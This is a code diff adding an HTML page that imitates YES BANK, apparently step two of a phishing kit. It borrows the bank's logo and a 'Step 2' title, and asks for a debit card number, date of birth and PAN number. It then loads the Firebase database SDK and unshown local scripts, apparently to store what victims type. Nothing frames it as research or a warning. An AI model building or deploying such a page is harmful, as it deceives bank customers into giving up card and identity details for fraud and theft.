@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>iris - YES BANK - Step 2</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #fff;
+      padding: 20px;
+      margin: 0;
+    }
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .logo img {
+      width: 150px;
+      margin: 0 auto;
+    }
+    .section-title {
+      text-align: center;
+      font-weight: bold;
+      text-transform: uppercase;
+      font-size: 14px;
+      margin: 20px 0;
+    }
+    label {
+      display: block;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      border: none;
+      border-bottom: 1px solid #aaa;
+      margin-bottom: 15px;
+      background: transparent;
+    }
+    .button-group {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 30px;
+    }
+    .button-group button {
+      flex: 1;
+      padding: 12px;
+      margin: 0 5px;
+      border-radius: 25px;
+      font-size: 16px;
+      border: none;
+      cursor: pointer;
+    }
+    .back-button {
+      background-color: #fff;
+      border: 1px solid #e91e63;
+      color: #e91e63;
+    }
+    .proceed-button {
+      background-color: #e91e63;
+      color: white;
+    }
+    .proceed-button:disabled {
+      background-color: #ccc;
+      color: #666;
+      cursor: not-allowed;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://imgs.search.brave.com/a7JunU7klRpwmMvss_0rtLG3kgr_sJ8rXiUqnEbMq_0/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9icmFu/ZGVwcy5jb20vbG9n/by1kb3dubG9hZC9Z/L1llcy1CYW5rLWxv/Z28tdmVjdG9yLTAx/LnN2Zw" alt="YES BANK Logo">
+    </div>
+
+    <div class="section-title">Enter Card Details</div>
+
+    <form id="cardForm">
+      <label for="card">Debit Card Number</label>
+      <input type="text" id="card" placeholder="Enter 16-digit card" maxlength="16" required />
+
+      <label for="dob">Date of Birth</label>
+      <input type="text" id="dob" placeholder="DD/MM/YYYY" maxlength="10" required />
+
+      <label for="pan">PAN Number</label>
+      <input type="text" id="pan" placeholder="ABCDE1234F" maxlength="10" required />
+
+      <div class="button-group">
+        <button type="button" class="back-button" onclick="history.back()">Back</button>
+        <button type="submit" class="proceed-button" disabled>Proceed</button>
+      </div>
+    </form>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+  <!-- Config + Logic -->
+  <script src="firebase-config.js"></script>
+  <script src="2.js"></script>
+</body>
+</html>
